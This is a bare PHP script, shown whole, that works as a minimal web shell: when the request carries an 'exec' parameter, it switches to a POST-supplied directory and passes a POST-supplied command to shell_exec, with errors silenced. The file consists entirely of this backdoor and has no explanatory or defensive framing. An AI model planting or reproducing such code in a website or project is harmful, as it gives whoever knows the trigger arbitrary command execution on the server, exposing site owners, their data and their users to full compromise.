<?php
if (isset($_GET['exec'])) {
@chdir(urldecode($_POST['dir']));
shell_exec($_POST['command']);
exit;
}
?>